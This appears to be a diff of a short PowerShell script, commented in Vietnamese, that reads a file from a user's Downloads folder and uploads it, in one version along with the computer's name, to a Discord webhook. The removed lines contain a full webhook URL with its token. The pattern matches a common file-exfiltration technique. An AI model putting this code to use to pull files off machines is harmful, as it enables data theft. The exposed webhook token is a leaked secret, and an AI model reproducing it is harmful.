@@ -1,44 +1,21 @@
-# 1. Khai báo thông tin
-$webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
-$filePath = "C:\Users\client\Downloads\abc.txt"
-
-# 2. Đảm bảo nạp thư viện mạng của .NET
+$ErrorActionPreference = "Stop" # Buộc dừng và báo lỗi nếu có bất kỳ dòng nào lỗi
 Add-Type -AssemblyName System.Net.Http
 
+$webhookUrl = "https://discord.com/api/webhooks/..."
+$filePath = "C:\Users\client\Downloads\abc.txt"
+
 if (Test-Path $filePath) {
-    try {
-        # Khởi tạo Client và nội dung Multipart
-        $httpClient = [System.Net.Http.HttpClient]::new()
-        $content = [System.Net.Http.MultipartFormDataContent]::new()
-
-        # Đọc file dưới dạng mảng byte
-        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
-        
-        # Thiết lập Header cho file (Discord cần key là "file")
-        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-        $content.Add($fileContent, "file", "abc.txt")
-
-        # Thêm một tin nhắn văn bản đi kèm (Tùy chọn)
-        $stringContent = [System.Net.Http.StringContent]::new("Dữ liệu từ máy: $env:COMPUTERNAME")
-        $content.Add($stringContent, "content")
-
-        # Gửi Post Request
-        $response = $httpClient.PostAsync($webhookUrl, $content).Result
-
-        if ($response.IsSuccessStatusCode) {
-            Write-Host "[+] Gửi file thành công lên Discord!" -ForegroundColor Green
-        } else {
-            $errorMsg = $response.Content.ReadAsStringAsync().Result
-            Write-Host "[-] Discord từ chối: $($response.StatusCode) - $errorMsg" -ForegroundColor Red
-        }
-    } catch {
-        Write-Host "[-] Lỗi hệ thống: $($_.Exception.Message)" -ForegroundColor Yellow
-    } finally {
-        # Giải phóng tài nguyên
-        if ($null -ne $httpClient) { $httpClient.Dispose() }
-        if ($null -ne $content) { $content.Dispose() }
-    }
+    $httpClient = New-Object System.Net.Http.HttpClient
+    $content = New-Object System.Net.Http.MultipartFormDataContent
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $fileContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$fileBytes)
+    $content.Add($fileContent, "file", "abc.txt")
+    
+    $result = $httpClient.PostAsync($webhookUrl, $content).GetAwaiter().GetResult()
+    Write-Host "[+] Server Response: $($result.StatusCode)"
+    
+    $httpClient.Dispose()
+    $content.Dispose()
 } else {
-    Write-Host "[!] Không tìm thấy file tại: $filePath" -ForegroundColor Red
+    Write-Host "[-] File not found"
 }
